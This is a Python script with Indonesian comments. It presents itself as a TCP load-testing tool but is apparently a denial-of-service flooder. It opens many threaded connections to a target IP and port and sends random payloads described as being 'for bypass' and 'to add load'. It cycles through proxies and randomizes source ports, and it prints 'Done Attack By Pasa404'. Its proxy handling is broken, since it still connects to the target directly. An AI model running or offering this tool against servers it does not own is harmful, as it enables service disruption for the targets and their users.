import socket
import time
import argparse
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import cycle

# Membaca proxy dari file proxy.txt (opsional)
def load_proxies(proxy_file):
    if proxy_file:
        with open(proxy_file, 'r') as f:
            proxies = [proxy.strip() for proxy in f.readlines()]
        return proxies
    return []

# Membuat koneksi TCP ke server
def create_tcp_connection(server_ip, server_port, proxy=None):
    try:
        start_time = time.time()

        # Randomize source port
        source_port = random.randint(1024, 65535)

        # Mengirim payload acak kecil untuk menambah variasi dan bypass
        random_payload = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(10, 50))).encode()

        # Jika menggunakan proxy, hubungkan ke proxy terlebih dahulu
        if proxy:
            proxy_ip, proxy_port = proxy.split(':')
            with socket.create_connection((proxy_ip, int(proxy_port)), timeout=2) as proxy_sock:
                proxy_sock.sendall(f'CONNECT {server_ip}:{server_port} HTTP/1.1\r\n\r\n'.encode())
                proxy_sock.recv(4096)  # Membaca response dari proxy

        # Membuat koneksi langsung ke server
        with socket.create_connection((server_ip, server_port), source_address=('', source_port), timeout=2) as sock:
            elapsed_time = time.time() - start_time
            # Mengirimkan payload acak untuk menambah beban
            sock.sendall(random_payload)
            sock.recv(4096)  # Membaca response dari server
            return True, elapsed_time

    except Exception as e:
        return False, str(e)

# Fungsi untuk menjalankan load test TCP
def load_test_tcp(server_ip, server_port, num_connections, max_workers, proxy_file):
    proxies = load_proxies(proxy_file)
    proxy_cycle = cycle(proxies) if proxies else None

    times = []
    successful_connections = 0

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [
            executor.submit(create_tcp_connection, server_ip, server_port, next(proxy_cycle) if proxy_cycle else None)
            for _ in range(num_connections)
        ]
        for future in as_completed(futures):
            success, elapsed_time = future.result()
            if success:
                successful_connections += 1
                times.append(elapsed_time)

    # Statistik
    total_connections = len(times)
    avg_time = sum(times) / total_connections if total_connections > 0 else float('nan')

    print(f"Total Connections: {num_connections}")
    print(f"Successful Connections: {successful_connections}")
    print(f"Average Connection Time: {avg_time:.2f} seconds")
    print(f"Min Connection Time: {min(times):.2f} seconds")
    print(f"Max Connection Time: {max(times):.2f} seconds")
    print(f"Done Attack By Pasa404")

# Fungsi utama untuk parsing argument dan menjalankan test
def main():
    parser = argparse.ArgumentParser(description='TCP Load Testing Tool')
    parser.add_argument('server_ip', type=str, help='Target IP address of the server')
    parser.add_argument('server_port', type=int, help='Target port of the server')
    parser.add_argument('rps', type=int, help='Number of requests per second')
    parser.add_argument('threads', type=int, help='Number of concurrent threads')
    parser.add_argument('proxy_file', type=str, help='File containing list of proxies', nargs='?', default=None)

    args = parser.parse_args()

    # Hitung jumlah total koneksi yang akan dibuat berdasarkan RPS dan durasi yang diberikan
    duration = 10  # Duration in seconds for which to send requests
    num_connections = args.rps * duration

    # Jalankan pengujian TCP dengan parameter yang diinput oleh pengguna
    load_test_tcp(args.server_ip, args.server_port, num_connections, args.threads, args.proxy_file)

if __name__ == "__main__":
    main()
